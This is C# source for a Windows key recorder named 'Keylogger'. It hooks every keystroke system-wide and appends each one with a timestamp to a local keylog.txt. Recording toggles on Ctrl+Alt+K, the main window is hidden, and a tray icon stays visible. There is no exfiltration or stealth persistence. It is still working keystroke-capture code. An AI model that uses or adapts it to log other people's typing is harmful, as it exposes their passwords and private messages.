using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

static class Program
{
    [DllImport("user32.dll")]
    static extern IntPtr SetWindowsHookEx(int id, IntPtr lpfn, IntPtr hMod, uint tid);

    [DllImport("user32.dll")]
    static extern bool UnhookWindowsHookEx(IntPtr h);

    [DllImport("user32.dll")]
    static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr p);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string n);

    [DllImport("user32.dll")]
    static extern bool RegisterHotKey(IntPtr h, int id, uint mods, uint vk);

    delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    struct KBDLLHOOKSTRUCT
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public IntPtr dwExtraInfo;
    }

    const int WH_KEYBOARD_LL = 13;
    const int WM_HOTKEY = 0x0312;
    const int HOTKEY_ID = 1;
    const uint MOD_CTRL = 2;
    const uint MOD_ALT = 1;

    static IntPtr hook;
    static bool recording = false;
    static string logPath;

    static IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam.ToInt32() == 0x0100 || wParam.ToInt32() == 0x0104))
        {
            KBDLLHOOKSTRUCT k = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
            if (recording)
            {
                string key = ((Keys)k.vkCode).ToString();
                if (key.Length > 1)
                {
                    if (key == "LControlKey" || key == "RControlKey") key = "Ctrl";
                    else if (key == "LMenu" || key == "RMenu") key = "Alt";
                    else if (key == "LShiftKey" || key == "RShiftKey") key = "Shift";
                    else if (key == "LWin" || key == "RWin") key = "Win";
                    else if (key == "Return") key = "Enter";
                    else if (key == "Space") key = "Space";
                    else if (key == "Tab") key = "Tab";
                    else if (key == "Escape") key = "Esc";
                    else if (key == "Back") key = "Backspace";
                    else if (key == "Capital") key = "CapsLock";
                }
                File.AppendAllText(logPath,
                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") + "  " + key + "\r\n");
            }
        }
        return CallNextHookEx(hook, nCode, wParam, lParam);
    }

    static void Toggle()
    {
        recording = !recording;
        File.AppendAllText(logPath,
            "\r\n=== " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "  " +
            (recording ? "RECORDING STARTED" : "RECORDING STOPPED") + " ===\r\n");
        Console.Beep(recording ? 1000 : 500, 90);
    }

    [STAThread]
    static void Main()
    {
        logPath = Path.Combine(
            Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "keylog.txt");

        using (Form f = new Form())
        {
            f.WindowState = FormWindowState.Minimized;
            f.ShowInTaskbar = false;
            f.FormBorderStyle = FormBorderStyle.None;
            f.Load += delegate { f.Hide(); };
            f.Show();

            LowLevelKeyboardProc proc = new LowLevelKeyboardProc(HookProc);
            hook = SetWindowsHookEx(WH_KEYBOARD_LL, Marshal.GetFunctionPointerForDelegate(proc),
                GetModuleHandle(null), 0);

            RegisterHotKey(f.Handle, HOTKEY_ID, MOD_CTRL | MOD_ALT, (uint)Keys.K);

            using (NotifyIcon tray = new NotifyIcon())
            {
                tray.Icon = SystemIcons.Application;
                tray.Text = "Keylogger";
                tray.Visible = true;
                tray.ShowBalloonTip(2000, "Keylogger", "Ctrl+Alt+K to toggle recording", ToolTipIcon.Info);

                HotkeyWindow hw = new HotkeyWindow(f.Handle, Toggle);
                Application.Run();
                UnhookWindowsHookEx(hook);
            }
        }
    }

    class HotkeyWindow : NativeWindow
    {
        private MethodInvoker toggle;

        public HotkeyWindow(IntPtr handle, MethodInvoker toggleAction)
        {
            this.toggle = toggleAction;
            this.AssignHandle(handle);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_HOTKEY)
                toggle();
            else
                base.WndProc(ref m);
        }
    }
}